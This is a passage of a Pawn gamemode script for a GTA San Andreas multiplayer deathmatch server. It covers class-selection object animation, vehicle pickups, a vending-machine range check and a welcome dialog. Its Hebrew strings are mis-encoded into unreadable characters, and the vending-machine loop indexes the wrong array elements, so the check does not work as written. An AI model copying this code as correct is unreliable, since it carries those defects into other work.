		CO(csmodels[csmodel],-2651.09,-22.21,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2652.36,-22.21,7.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2652.16,-22.21,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2652.64,-22.22,6.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2652.93,-22.19,7.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2653.17,-22.21,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2651.97,-22.25,6.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2653.55,-22.20,5.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2653.38,-22.20,6.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2652.67,-22.21,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2650.19,-22.21,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2651.09,-22.21,7.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2651.09,-22.21,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2651.08,-22.21,6.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.03,-22.23,7.35,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2650.69,-22.21,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2650.47,-22.21,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2651.09,-22.21,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.77,-22.21,7.38,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.75,-22.21,6.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.71,-22.21,6.37,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.68,-22.21,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2642.35,-22.25,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.89,-22.26,6.37,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.91,-22.25,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2646.40,-22.18,6.98,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.92,-22.19,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.33,-22.23,6.86,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.33,-22.23,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.90,-22.16,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2647.20,-22.20,6.98,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2646.79,-22.19,6.98,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.89,-22.24,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.87,-22.27,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.39,-22.27,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.89,-22.24,6.37,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.87,-22.24,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.87,-22.24,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2648.87,-22.24,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.90,-22.14,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2644.99,-22.17,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2644.91,-22.27,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.41,-22.27,6.37,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.42,-22.27,6.88,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.43,-22.18,7.39,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2645.43,-22.16,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.89,-22.26,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2643.37,-22.26,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2642.86,-22.25,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.75,-22.17,7.79,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2649.68,-22.21,5.87,0.00,0.00,0.00);
		CO(csmodels[csmodel],-2650.47,-22.21,6.88,0.00,0.00,0.00);
		#undef CO
		csstatus = 1;
	}
	else
	{
		csstatus++;
		new i = 0, Float:mspeed = 5.0;
		#define MO(%1,%2,%3,%4) MoveSObject(csobject[i++],%1,%2,csmodel >= 1 && csmodel <= 3 ? ((%3)-1.2) : %3,%4)
		switch(csstatus)
		{
			case 1:
			{
				MO(-2651.77,-22.22,5.88,mspeed);
				MO(-2655.50,-22.16,5.88,mspeed);
				MO(-2655.09,-22.16,5.88,mspeed);
				MO(-2654.69,-22.17,5.88,mspeed);
				MO(-2654.30,-22.18,5.88,mspeed);
				MO(-2654.30,-22.18,6.38,mspeed);
				MO(-2654.32,-22.18,6.88,mspeed);
				MO(-2654.72,-22.17,6.88,mspeed);
				MO(-2655.10,-22.16,6.88,mspeed);
				MO(-2655.50,-22.16,6.88,mspeed);
				MO(-2655.49,-22.16,7.39,mspeed);
				MO(-2655.49,-22.16,7.79,mspeed);
				MO(-2655.10,-22.16,7.79,mspeed);
				MO(-2654.70,-22.17,7.79,mspeed);
				MO(-2654.32,-22.18,7.79,mspeed);
				MO(-2651.09,-22.21,5.87,mspeed);
				MO(-2652.36,-22.21,7.38,mspeed);
				MO(-2652.16,-22.21,6.88,mspeed);
				MO(-2652.64,-22.22,6.38,mspeed);
				MO(-2652.93,-22.19,7.38,mspeed);
				MO(-2653.17,-22.21,6.88,mspeed);
				MO(-2651.97,-22.25,6.38,mspeed);
				MO(-2653.55,-22.20,5.88,mspeed);
				MO(-2653.38,-22.20,6.38,mspeed);
				MO(-2652.67,-22.21,7.79,mspeed);
				MO(-2650.19,-22.21,7.39,mspeed);
				MO(-2651.09,-22.21,7.38,mspeed);
				MO(-2651.09,-22.21,6.88,mspeed);
				MO(-2651.08,-22.21,6.38,mspeed);
				MO(-2648.03,-22.23,7.35,mspeed);
				MO(-2650.69,-22.21,7.39,mspeed);
				MO(-2650.47,-22.21,6.88,mspeed);
				MO(-2651.09,-22.21,7.79,mspeed);
				MO(-2649.77,-22.21,7.38,mspeed);
				MO(-2649.75,-22.21,6.87,mspeed);
				MO(-2649.71,-22.21,6.37,mspeed);
				MO(-2649.68,-22.21,5.87,mspeed);
				MO(-2642.35,-22.25,5.87,mspeed);
				MO(-2643.89,-22.26,6.37,mspeed);
				MO(-2643.91,-22.25,6.88,mspeed);
				MO(-2646.40,-22.18,6.98,mspeed);
				MO(-2645.92,-22.19,7.79,mspeed);
				MO(-2648.33,-22.23,6.86,mspeed);
				MO(-2648.33,-22.23,7.79,mspeed);
				MO(-2643.90,-22.16,7.39,mspeed);
				MO(-2647.20,-22.20,6.98,mspeed);
				MO(-2646.79,-22.19,6.98,mspeed);
				MO(-2648.89,-22.24,5.87,mspeed);
				MO(-2645.87,-22.27,5.87,mspeed);
				MO(-2645.39,-22.27,5.87,mspeed);
				MO(-2648.89,-22.24,6.37,mspeed);
				MO(-2648.87,-22.24,6.88,mspeed);
				MO(-2648.87,-22.24,7.39,mspeed);
				MO(-2648.87,-22.24,7.79,mspeed);
				MO(-2643.90,-22.14,7.79,mspeed);
				MO(-2644.99,-22.17,7.79,mspeed);
				MO(-2644.91,-22.27,5.87,mspeed);
				MO(-2645.41,-22.27,6.37,mspeed);
				MO(-2645.42,-22.27,6.88,mspeed);
				MO(-2645.43,-22.18,7.39,mspeed);
				MO(-2645.43,-22.16,7.79,mspeed);
				MO(-2643.89,-22.26,5.87,mspeed);
				MO(-2643.37,-22.26,5.87,mspeed);
				MO(-2642.86,-22.25,5.87,mspeed);
				MO(-2649.75,-22.17,7.79,mspeed);
				MO(-2649.68,-22.21,5.87,mspeed);
				MO(-2650.47,-22.21,6.88,mspeed);
			}
			case 2:
			{
				MO(-2652.28,-22.24,5.88,mspeed);
				MO(-2655.50,-22.16,5.88,mspeed);
				MO(-2655.09,-22.16,5.88,mspeed);
				MO(-2654.69,-22.17,5.88,mspeed);
				MO(-2654.30,-22.18,5.88,mspeed);
				MO(-2655.53,-22.23,6.38,mspeed);
				MO(-2654.32,-22.18,6.88,mspeed);
				MO(-2652.28,-22.38,6.88,mspeed);
				MO(-2652.30,-22.35,7.41,mspeed);
				MO(-2655.50,-22.16,6.88,mspeed);
				MO(-2654.31,-22.11,7.39,mspeed);
				MO(-2655.49,-22.16,7.79,mspeed);
				MO(-2654.32,-22.18,7.79,mspeed);
				MO(-2651.19,-22.22,5.87,mspeed);
				MO(-2653.18,-22.24,7.38,mspeed);
				MO(-2652.87,-22.24,6.88,mspeed);
				MO(-2652.64,-22.22,6.38,mspeed);
				MO(-2653.57,-22.21,7.38,mspeed);
				MO(-2653.57,-22.22,6.88,mspeed);
				MO(-2652.27,-22.26,6.38,mspeed);
				MO(-2653.55,-22.20,5.88,mspeed);
				MO(-2653.57,-22.21,6.38,mspeed);
				MO(-2653.56,-22.24,7.79,mspeed);
				MO(-2650.79,-22.22,7.38,mspeed);
				MO(-2650.79,-22.22,6.88,mspeed);
				MO(-2650.77,-22.22,5.88,mspeed);
				MO(-2643.78,-22.27,7.35,mspeed);
				MO(-2652.31,-22.27,7.77,mspeed);
				MO(-2650.37,-22.22,5.88,mspeed);
				MO(-2650.39,-22.22,7.79,mspeed);
				MO(-2651.20,-22.17,7.79,mspeed);
				MO(-2648.34,-22.23,7.38,mspeed);
				MO(-2648.36,-22.16,6.87,mspeed);
				MO(-2650.78,-22.21,6.37,mspeed);
				MO(-2643.74,-22.19,5.87,mspeed);
				MO(-2642.70,-22.20,6.72,mspeed);
				MO(-2647.47,-22.13,7.79,mspeed);
				MO(-2649.20,-22.31,7.81,mspeed);
				MO(-2643.00,-22.25,6.30,mspeed);
				MO(-2643.05,-22.25,7.16,mspeed);
				MO(-2648.40,-22.24,5.87,mspeed);
				MO(-2643.34,-22.22,6.07,mspeed);
				MO(-2648.37,-22.23,6.37,mspeed);
				MO(-2643.76,-22.11,6.88,mspeed);
				MO(-2643.42,-22.28,7.55,mspeed);
				MO(-2650.80,-22.22,7.79,mspeed);
				MO(-2644.90,-22.24,7.77,mspeed);
				MO(-2648.37,-22.21,7.79,mspeed);
				MO(-2643.74,-22.19,6.37,mspeed);
				MO(-2648.78,-22.19,7.79,mspeed);
				MO(-2655.49,-22.16,7.39,mspeed);
				MO(-2654.30,-22.18,6.38,mspeed);
				MO(-2647.90,-22.19,7.79,mspeed);
				MO(-2643.77,-22.26,7.79,mspeed);
				MO(-2646.43,-22.22,7.79,mspeed);
				MO(-2646.43,-22.22,7.39,mspeed);
				MO(-2646.43,-22.22,6.38,mspeed);
				MO(-2646.43,-22.22,5.87,mspeed);
				MO(-2645.93,-22.26,7.79,mspeed);
				MO(-2645.42,-22.29,7.79,mspeed);
				MO(-2646.43,-22.22,6.88,mspeed);
				MO(-2645.93,-22.26,5.87,mspeed);
				MO(-2645.42,-22.29,5.87,mspeed);
				MO(-2644.90,-22.24,5.85,mspeed);
				MO(-2644.90,-22.24,6.86,mspeed);
				MO(-2645.42,-22.29,6.89,mspeed);
				MO(-2645.93,-22.26,6.88,mspeed);
			}
			case 3:
			{
				MO(-2652.08,-22.26,5.88,mspeed);
				MO(-2655.50,-22.16,5.88,mspeed);
				MO(-2655.09,-22.16,5.88,mspeed);
				MO(-2654.69,-22.17,5.88,mspeed);
				MO(-2655.53,-22.20,6.38,mspeed);
				MO(-2654.32,-22.18,6.37,mspeed);
				MO(-2655.50,-22.16,6.88,mspeed);
				MO(-2655.49,-22.16,7.39,mspeed);
				MO(-2655.49,-22.16,7.79,mspeed);
				MO(-2655.10,-22.16,7.79,mspeed);
				MO(-2654.70,-22.17,7.79,mspeed);
				MO(-2654.32,-22.18,7.39,mspeed);
				MO(-2651.68,-22.26,5.87,mspeed);
				MO(-2652.96,-22.21,7.78,mspeed);
				MO(-2652.12,-22.21,7.78,mspeed);
				MO(-2651.76,-22.21,6.89,mspeed);
				MO(-2652.96,-22.18,7.38,mspeed);
				MO(-2652.96,-22.20,6.88,mspeed);
				MO(-2652.52,-22.25,6.89,mspeed);
				MO(-2652.97,-22.19,6.38,mspeed);
				MO(-2652.52,-22.19,7.79,mspeed);
				MO(-2649.58,-22.20,7.75,mspeed);
				MO(-2649.80,-22.20,7.38,mspeed);
				MO(-2650.26,-22.21,6.38,mspeed);
				MO(-2652.51,-22.26,5.88,mspeed);
				MO(-2651.75,-22.30,7.77,mspeed);
				MO(-2649.10,-22.29,6.88,mspeed);
				MO(-2649.33,-22.19,7.37,mspeed);
				MO(-2646.38,-22.37,7.34,mspeed);
				MO(-2649.81,-22.29,6.37,mspeed);
				MO(-2650.48,-22.29,5.87,mspeed);
				MO(-2643.89,-22.26,6.37,mspeed);
				MO(-2643.91,-22.25,6.88,mspeed);
				MO(-2646.37,-22.34,6.56,mspeed);
				MO(-2642.64,-22.24,7.75,mspeed);
				MO(-2643.90,-22.16,7.39,mspeed);
				MO(-2642.69,-22.45,7.33,mspeed);
				MO(-2646.37,-22.34,6.94,mspeed);
				MO(-2645.99,-22.36,7.79,mspeed);
				MO(-2646.39,-22.32,7.79,mspeed);
				MO(-2643.90,-22.14,7.79,mspeed);
				MO(-2642.67,-22.44,6.37,mspeed);
				MO(-2643.02,-22.42,6.90,mspeed);
				MO(-2642.65,-22.33,6.87,mspeed);
				MO(-2643.89,-22.26,5.87,mspeed);
				MO(-2642.58,-22.26,5.87,mspeed);
				MO(-2647.20,-22.27,7.79,mspeed);
				MO(-2648.69,-22.39,5.87,mspeed);
				MO(-2650.05,-22.21,6.88,mspeed);
				MO(-2654.32,-22.18,6.88,mspeed);
				MO(-2652.12,-22.24,6.89,mspeed);
				MO(-2652.95,-22.24,5.88,mspeed);
				MO(-2649.34,-22.28,6.37,mspeed);
				MO(-2655.53,-22.20,6.38,mspeed);
				MO(-2654.32,-22.18,7.39,mspeed);
				MO(-2643.02,-22.42,6.90,mspeed);
				MO(-2643.47,-22.31,6.89,mspeed);
				MO(-2645.49,-22.11,7.79,mspeed);
				MO(-2643.89,-22.26,6.37,mspeed);
				MO(-2643.89,-22.26,5.87,mspeed);
				MO(-2646.36,-22.27,6.18,mspeed);
				MO(-2646.36,-22.30,5.82,mspeed);
				MO(-2646.80,-22.28,7.79,mspeed);
				MO(-2648.87,-22.30,6.37,mspeed);
				MO(-2646.39,-22.32,7.79,mspeed);
				MO(-2648.69,-22.39,5.87,mspeed);
				MO(-2646.39,-22.32,7.79,mspeed);
			}
			case 4:
			{
				MO(-2655.09,-22.17,5.88,mspeed);
				MO(-2653.79,-22.19,5.88,mspeed);
				MO(-2655.11,-22.16,6.38,mspeed);
				MO(-2653.82,-22.19,6.88,mspeed);
				MO(-2654.40,-22.17,7.08,mspeed);
				MO(-2655.10,-22.17,6.88,mspeed);
				MO(-2655.09,-22.17,7.39,mspeed);
				MO(-2655.09,-22.17,7.79,mspeed);
				MO(-2654.70,-22.17,7.49,mspeed);
				MO(-2654.20,-22.18,7.49,mspeed);
				MO(-2653.86,-22.19,7.79,mspeed);
				MO(-2652.31,-22.22,5.87,mspeed);
				MO(-2646.35,-22.28,6.88,mspeed);
				MO(-2653.84,-22.17,7.38,mspeed);
				MO(-2643.05,-22.34,6.88,mspeed);
				MO(-2643.91,-22.24,6.38,mspeed);
				MO(-2653.81,-22.19,6.38,mspeed);
				MO(-2645.48,-22.30,7.79,mspeed);
				MO(-2651.70,-22.22,7.38,mspeed);
				MO(-2651.90,-22.25,6.88,mspeed);
				MO(-2652.10,-22.24,6.38,mspeed);
				MO(-2651.19,-22.23,7.39,mspeed);
				MO(-2642.61,-22.22,7.80,mspeed);
				MO(-2651.46,-22.28,7.79,mspeed);
				MO(-2643.93,-22.43,7.38,mspeed);
				MO(-2650.95,-22.22,6.87,mspeed);
				MO(-2651.44,-22.25,6.37,mspeed);
				MO(-2650.48,-22.22,5.87,mspeed);
				MO(-2642.57,-22.28,5.87,mspeed);
				MO(-2646.34,-22.22,6.37,mspeed);
				MO(-2643.91,-22.25,6.88,mspeed);
				MO(-2643.91,-22.45,7.81,mspeed);
				MO(-2647.95,-22.34,7.79,mspeed);
				MO(-2648.33,-22.23,6.86,mspeed);
				MO(-2648.33,-22.23,7.79,mspeed);
				MO(-2645.03,-22.14,7.79,mspeed);
				MO(-2642.61,-22.23,7.36,mspeed);
				MO(-2642.61,-22.26,6.88,mspeed);
				MO(-2648.34,-22.33,5.87,mspeed);
				MO(-2646.30,-22.27,5.87,mspeed);
				MO(-2642.59,-22.29,6.37,mspeed);
				MO(-2648.30,-22.32,7.39,mspeed);
				MO(-2648.67,-22.27,7.79,mspeed);
				MO(-2645.88,-22.11,7.79,mspeed);
				MO(-2646.30,-22.15,7.79,mspeed);
				MO(-2645.91,-22.25,5.87,mspeed);
				MO(-2648.34,-22.25,6.37,mspeed);
				MO(-2643.47,-22.32,6.88,mspeed);
				MO(-2646.31,-22.16,7.39,mspeed);
				MO(-2647.57,-22.40,7.79,mspeed);
				MO(-2645.45,-22.23,5.87,mspeed);
				MO(-2645.01,-22.23,5.87,mspeed);
				MO(-2643.89,-22.23,5.87,mspeed);
				MO(-2649.04,-22.27,7.79,mspeed);
				MO(-2650.67,-22.24,6.37,mspeed);
				MO(-2642.57,-22.28,5.87,mspeed);
				MO(-2642.59,-22.29,6.37,mspeed);
				MO(-2642.61,-22.26,6.88,mspeed);
				MO(-2642.61,-22.23,7.36,mspeed);
				MO(-2643.05,-22.34,6.88,mspeed);
				MO(-2643.47,-22.32,6.88,mspeed);
				MO(-2643.89,-22.23,5.87,mspeed);
				MO(-2643.91,-22.24,6.38,mspeed);
				MO(-2643.91,-22.25,6.88,mspeed);
				MO(-2643.93,-22.43,7.38,mspeed);
				MO(-2643.91,-22.45,7.81,mspeed);
				MO(-2645.03,-22.14,7.79,mspeed);
			}
			case 5:
			{
				csmodel++;
				if(csmodel >= sizeof(csmodels)) csmodel = 0;
				for(new j = 0; j < sizeof(csobject); j++) if(csobject[j] != -1)
				{
					DestroySObject(csobject[j]);
					if(csobject[j] != -1) csobject[j] = -1;
				}
				for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && GetPlayerVirtualWorld(j) == world_reqclass) Streamer_Update(j);
				csobjects = 0, csstatus = 0;
				HandleClassSelectionObjects();
			}
		}
		#undef MO
	}
	return 1;
}
//=[HandleClassSelectionNPCs]===================================================
stock HandleClassSelectionNPCs()
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerNPC(i) && playerinfo[i][selfnpc] > -1 && NPCs[playerinfo[i][selfnpc]][npcParam] == np_reqclass)
	{
		SetPlayerSkin(i,GetRandomSkin());
		switch(random(2))
		{
			case 0: ApplyAnimation(i,"ON_LOOKERS","shout_02",4.1,0,1,1,1,1,1);
			case 1: ApplyAnimation(i,"ON_LOOKERS","wave_loop",4.1,0,1,1,1,1,1);
		}
	}
	return 1;
}
//=[TFO_Set]====================================================================
stock TFO_Set(playerid,st=tfo_none) return playerinfo[playerid][tfostatus] = st, 1;
//=[TFO_Add]====================================================================
stock TFO_Add(playerid)
{
	for(new i = 0; i < tfoPlayers; i++) if(tfoPlayer[i] == playerid) return 1;
	return tfoPlayer[tfoPlayers++] = playerid, 1;
}
//=[TFO_Remove]=================================================================
stock TFO_Remove(playerid)
{
	new p = -1;
	for(new i = 0; i < tfoPlayers && p == -1; i++) if(tfoPlayer[i] == playerid) p = i;
	for(new i = p; i < tfoPlayers - 1; i++) tfoPlayer[i] = tfoPlayer[i + 1];
	return tfoPlayer[tfoPlayers--] = INVALID_PLAYER_ID, 1;
}
//=[TFO_Exist]==================================================================
stock TFO_Exist(playerid)
{
	for(new i = 0; i < tfoPlayers; i++) if(tfoPlayer[i] == playerid) return 1;
	return 0;
}
//=[CreateVehiclePickup]========================================================
stock CreateVehiclePickup(Float:x,Float:y,Float:z,world,vptype,param = 0)
{
	switch(vptype)
	{
		case vp_repair: return SetPickupText(CreatePickupEx(3096,14,x,y,z+1.2,3+vp_repair,world),"[" @c(lightgreen) "·щўхя °ыс" @c(white) "]");
		case vp_nitro: return SetPickupText(CreatePickupEx(1010,14,x,y,z,3+vp_nitro,world),"[" @c(darkblue) "Ёщш°х" @c(white) "]");
		case vp_replace:
		{
			new str[64];
			format(str,sizeof(str),"[" @c(orange) "%s" @c(white) "]",GetVehicleName(param));
			return SetPickupText(CreatePickupEx(19134,14,x,y,z,3+vp_replace,world,param),str);
		}
		case vp_turbo: return SetPickupText(CreatePickupEx(19130,14,x,y,z,3+vp_turbo,world),"[" @c(darkred) "шх°сх" @c(white) "]");
	}
	return 1;
}
//=[ReplaceVehicle]=============================================================
stock ReplaceVehicle(playerid,model)
{
	new v = GetPlayerVehicleID(playerid);
	if(GetVehicleModel(v) == model) return 1;
	new Float:p[8], c1 = vehicleinfo[v][newvcol][0], c2 = vehicleinfo[v][newvcol][1], iw[2], flag = 0;
	GetVehiclePos(v,p[0],p[1],p[2]);
	GetVehicleZAngle(v,p[3]);
	GetVehicleVelocity(v,p[4],p[5],p[6]);
	GetVehicleHealth(v,p[7]);
	iw[0] = vehicleinfo[v][veint], iw[1] = GetVehicleVirtualWorld(v);
	if(playerinfo[playerid][vtemp] != INVALID_VEHICLE_ID)
	{
		DestroyVehicleEx(v);
		flag = 1;
	}
	new newv = CreateVehicleEx(model,p[0],p[1],p[2],p[3],c1,c2,respawntime,iw[0],iw[1]);
	playerinfo[playerid][vtemp] = newv;
	PutPlayerInVehicle(playerid,newv,0);
	SetVehicleVelocity(newv,p[4],p[5],p[6]);
	SetVehicleHealth(newv,p[7]);
	if(!flag) SetVehicleToRespawn(v);
	return 1;
}
//=[IsPlayerNearVendingMachine]=================================================
stock IsPlayerNearVendingMachine(playerid)
{
	new Float:machines[][3] =
	{
		{-14.70,1175.36,18.95},
		{201.02,-107.62,0.90},
		{662.43,-552.16,15.71},
		{-76.03,1227.99,19.13},
		{1154.73,-1460.89,15.16},
		{1277.84,372.52,18.95},
		{1398.84,2222.61,10.42},
		{1520.15,1055.27,10.00},
		{1634.11,-2237.53,12.89},
		{1659.46,1722.86,10.22},
		{1729.79,-1943.05,12.95},
		{1789.21,-1369.27,15.16},
		{1928.73,-1772.45,12.95},
		{2060.12,-1897.64,12.93},
		{2085.77,2071.36,10.45},
		{2139.52,-1161.48,23.36},
		{2153.23,-1016.15,62.23},
		{2271.73,-76.46,25.96},
		{2319.99,2532.85,10.22},
		{2325.98,-1645.13,14.21},
		{2352.18,-1357.16,23.77},
		{2480.86,-1959.27,12.96},
		{2503.14,1243.70,10.22},
		{-253.74,2597.95,62.24},
		{-253.74,2599.76,62.24},
		{2647.70,1129.66,10.22},
		{2845.73,1295.05,10.79},
		{-862.83,1536.61,21.98},
		{-1350.12,492.29,10.59},
		{-1350.12,493.86,10.59},
		{-1455.12,2591.66,55.23},
		{-1980.79,142.66,27.07},
		{-2005.65,-490.05,34.73},
		{-2011.14,-398.34,34.73},
		{-2034.46,-490.05,34.73},
		{-2039.85,-398.34,34.73},
		{-2063.27,-490.05,34.73},
		{-2068.56,-398.34,34.73},
		{-2092.09,-490.05,34.73},
		{-2097.27,-398.34,34.73},
		{-2118.62,-422.41,34.73},
		{-2118.97,-423.65,34.73},
		{-2229.19,286.41,34.70},
		{-2420.18,985.95,44.30},
		{-2420.22,984.58,44.30},
		{2155.84,1607.88,1000.06},
		{2155.91,1606.77,1000.05},
		{2202.45,1617.01,1000.06},
		{2209.24,1621.21,1000.06},
		{2209.91,1607.20,1000.05},
		{2222.20,1606.77,1000.05},
		{2222.37,1602.64,1000.06},
		{2225.20,-1153.42,1025.91},
		{-15.10,-140.23,1003.63},
		{-16.12,-91.64,1003.63},
		{-16.53,-140.30,1003.63},
		{-17.55,-91.71,1003.63},
		{-19.04,-57.84,1003.63},
		{-32.45,-186.70,1003.63},
		{-33.88,-186.77,1003.63},
		{330.68,178.50,1020.07},
		{331.92,178.50,1020.07},
		{-35.73,-140.23,1003.63},
		{350.91,206.09,1008.48},
		{-36.15,-57.88,1003.63},
		{361.56,158.62,1008.48},
		{371.59,178.45,1020.07},
		{373.83,-178.14,1000.73},
		{374.89,188.98,1008.48},
		{379.04,-178.88,1000.73},
		{495.97,-24.32,1000.73},
		{500.56,-1.37,1000.73},
		{501.83,-1.43,1000.73},
		{2576.70,-1284.43,1061.09}
	};
	for(new i = 0; i < sizeof(machines); i++) if(IsPlayerInRangeOfPoint(playerid,3.0,machines[0],machines[1],machines[2])) return 1;
	return 0;
}
//=[PlayAudioStreamForPlayer]===================================================
#undef PlayAudioStreamForPlayer
stock PlayAudioStreamForPlayer2(playerid,url[],Float:posX = 0.0,Float:posY = 0.0,Float:posZ = 0.0,Float:distance = 50.0,usepos = 0)
{
	if(Options[12][optActive] || playerinfo[playerid][playingmusic] || !playerinfo[playerid][setting][setting_sounds] || IsPlayerAFK_(playerid)) return 1;
	return PlayAudioStreamForPlayer(playerid,url,posX,posY,posZ,distance,usepos);
}
#define PlayAudioStreamForPlayer PlayAudioStreamForPlayer2
//=[IsPlayerAFK_]===============================================================
stock IsPlayerAFK_(playerid) return (playerinfo[playerid][modeafk] || (playerinfo[playerid][idletime] >= 20 && playerinfo[playerid][spawned] && !playerinfo[playerid][reqclass])) || (playerinfo[playerid][sguard][0] & IsPlayerAFK(playerid));
//=[ShowEnterDialog]============================================================
stock ShowEnterDialog(playerid)
{
	if(!strlen(playerinfo[playerid][secretword])) ShowPlayerConstDialog(playerid,dialog_secretword,2);
	else
	{
		#pragma tabsize 0
		new string[M_S], td[6], param = 0;
		gettime(td[0],td[1],td[2]);
		getdate(td[3],td[4],td[5]);
		DialogCreate(4);
		DialogString(@h(00FF00) "!с°хыщэ ф∙сщэ ь∙°· ∙ьЁх, ф·чс°· сфЎьчф ью∙·ю∙ ∙ьъ");
		format(string,sizeof(string),"°юф: " @c(yellow) "%d" @h(00FF00) " Х ф°щтх·: " @c(yellow) "%d" @h(00FF00) " Х ыёє: " @c(yellow) "$%d",playerinfo[playerid][level],playerinfo[playerid][kills],playerinfo[playerid][bank]);
		DialogFormat(string);
		DialogString(@c(orange) "\n\n\t\tХ Х Х Х Х ?юф ўх°ф Х Х Х Х Х\n");
		format(string,sizeof(string),@c(lightyellow) "- .фщхэ щхэ %s, %02d/%02d/%04d %02d:%02d",GetDay(td[3],td[4],td[5],1),td[5],td[4],td[3],td[0],td[1]);
		DialogFormat(string);
		format(string,sizeof(string),"- .цфх фщхэ ф-%d ∙ьъ с∙°·",Seniority(playerid));
		DialogFormat(string);
		format(string,sizeof(string),"- ыЁщё·ъ фрч°хЁф фщщ·ф с·р°щъ: %s",GetLastConnectDate(GetName(playerid)));
		DialogFormat(string);
		if(td[4] == playerinfo[playerid][birthdate][1] && td[5] == playerinfo[playerid][birthdate][0])
		{
			format(string,sizeof(string),@c(lightred) " - !юць шхс ьщхэ фхьу·ъ ф-%d" @c(lightyellow),td[3]-playerinfo[playerid][birthdate][2]);
			DialogFormat(string);
		}
		if(specialActivity != sa_none)
		{
			format(string,sizeof(string),"- .ю·ўщщэ юю∙ Єы∙щх: " @c(lightgreen) "%s" @c(lightyellow),SActivityName(specialActivity,1));
			DialogFormat(string);
		}
		for(new i = 0; i < sizeof(Options); i++) if(Options[i][optActive])
		{
			format(string,sizeof(string),"- .фрхЇЎщф " @c(lightgreen) "%s" @c(lightyellow) " ЇЄщьф ыЄ·",Options[i][optName]);
			DialogFormat(string);
		}
		if(!PlayerDefinedName(playerid))
		{
			format(string,sizeof(string),"- /Profile :Єху ьр ЄуыЁ· р· ф∙э фЇ°шщ ∙ьъ, р·ф юхцюя ьЄуыя Єы∙щх",SActivityName(specialActivity,1));
			DialogFormat(string);
		}
		DialogString(@c(orange) "\n\t\tХ Х Х Х Х !чу∙ с∙°· Х Х Х Х Х\n");
		if((param = DaysBetweenDates(curNewsDate,GetDateAsString())) <= 14)
		{
			switch(param)
			{
				case 0: string = @c(white) "фщхэ" @h(7BA7E1);
				case 1: string = @c(white) "р·юхь" @h(7BA7E1);
				case 2..5: format(string,sizeof(string),@c(white) "ьЇЁщ %d щющэ" @h(7BA7E1),param);
				case 6..7: string = "ьЇЁщ Їчх· ю∙схЄ";
				case 8..14: string = "ьЇЁщ Їчх· ю∙схЄщщэ";
			}
			format(string,sizeof(string),@h(7BA7E1) "+ :(фЄуыхя фрч°хя фхр Єуыхя юёЇ° #%d ∙фщф с·р°щъ %s (%s",curNews,curNewsDate,string);
			DialogFormat(string);
		}
		else
		{
			format(string,sizeof(string),@h(7BA7E1) "+ :рщя ЄуыхЁщэ чу∙щэ. фЄуыхя фрч°хя фхр Єуыхя #%d юф·р°щъ %s",curNews,curNewsDate);
			DialogFormat(string);
		}
		DialogFormat(curNewsFirstLine);
		DialogString(@h(7BA7E1) "...News ыущ ьў°хр р· фю∙ъ фЄуыхя ьчї");
		DialogString("\n\n" @c(white) "!Ўхх· фрующЁщэ юрчь ьъ ю∙чў юфЁф. ьыь сЄщф рЁчЁх ыря ь∙°х·ъ");
		format(string,sizeof(string),comname " DeathMatch V" version);
		DialogFormat(string);
		switch(td[0])
		{
			case 5..11: string = "схў° шхс";
			case 12..16: string = "Ўф°щщэ шхсщэ";
			case 17..20: string = "Є°с шхс";
			case 21..23, 0..4: string = "ьщьф шхс";
		}
		if(PlayerDefinedName(playerid)) format(string,sizeof(string),@c(lightblue) "(: !%s, %s",string,playerinfo[playerid][rname]);
		else format(string,sizeof(string),@c(lightblue) "(: !%s ,%s",GetName(playerid), string);
